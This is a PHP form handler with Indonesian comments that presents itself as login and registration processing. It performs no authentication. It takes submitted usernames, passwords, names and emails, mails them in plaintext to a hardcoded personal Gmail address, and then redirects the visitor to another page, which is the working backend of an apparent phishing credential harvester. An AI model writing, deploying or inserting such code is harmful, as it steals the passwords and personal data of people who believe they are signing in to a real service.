<?php
// Konfigurasi email
$to_email = "fatihsukawafda@gmail.com";
$subject = "Data Login/Registrasi";

// Fungsi untuk mengirim email
function kirim_email($to_email, $subject, $message) {
  $headers = "From: fatihsukawafda@gmail.com\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
  mail($to_email, $subject, $message, $headers);
}

// Fungsi untuk memvalidasi input
function validasi_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
  return $data;
}

// Proses data login
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["login"])) {
  $username = validasi_input($_POST["username"]);
  $password = validasi_input($_POST["password"]);
  if (empty($username) || empty($password)) {
    $error = "Username dan password tidak boleh kosong!";
  } else {
    $message = "Data Login:<br>Username: $username<br>Password: $password";
    kirim_email($to_email, $subject, $message);
    header('Location: ndandenk.html');
    exit;
  }
}

// Proses data registrasi
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["registrasi"])) {
  $nama = validasi_input($_POST["nama"]);
  $email = validasi_input($_POST["email"]);
  $username = validasi_input($_POST["username"]);
  $password = validasi_input($_POST["password"]);
  if (empty($nama) || empty($email) || empty($username) || empty($password)) {
    $error = "Semua field tidak boleh kosong!";
  } else {
    $message = "Data Registrasi:<br>Nama: $nama<br>Email: $email<br>Username: $username<br>Password: $password";
    kirim_email($to_email, $subject, $message);
    header('Location: ndandenk.html');
    exit;
  }
}

// Tampilkan error jika ada
if (isset($error)) {
  echo "<p style='color: red;'>$error</p>";
}
?>